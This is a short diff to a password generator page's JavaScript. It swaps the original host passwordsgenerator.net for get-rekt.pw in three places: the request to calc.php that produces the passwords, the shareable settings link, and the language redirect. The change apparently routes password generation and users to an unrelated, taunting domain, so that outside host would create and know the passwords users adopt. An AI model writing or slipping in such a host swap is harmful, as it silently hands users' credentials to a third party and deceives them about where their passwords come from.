@@ -164,7 +164,7 @@ function d2O() {
                     if (b7) s_('final_pass');
                 }
             };
-            c.open("GET", "//passwordsgenerator.net/calc.php?Length=" + b + "&Symbols=" + a + "&Lowercase=" + g + "&Uppercase=" + l + "&Numbers=" + p + "&Nosimilar=" + f + "&Last=" + m, true);
+            c.open("GET", "//get-rekt.pw/calc.php?Length=" + b + "&Symbols=" + a + "&Lowercase=" + g + "&Uppercase=" + l + "&Numbers=" + p + "&Nosimilar=" + f + "&Last=" + m, true);
             c.send()
         }
     }
@@ -299,7 +299,7 @@ function OpenMyURL() {
     if ($("Client").checked) cl = 1;
     if ($("AutoSelect").checked) au = 1;
 
-    var strLink = "//passwordsgenerator.net/?";
+    var strLink = "//get-rekt.pw/?";
     strLink += "length=" + le;
     strLink += "&symbols=" + sy;
     strLink += "&numbers=" + nu;
@@ -367,5 +367,5 @@ function scroll2top() {
 function SelCountry() {
     var strCountry = $("idCountry").value;
     if (strCountry != "en")
-        window.location.href = "//passwordsgenerator.net/" + strCountry;
+        window.location.href = "//get-rekt.pw/" + strCountry;
 }
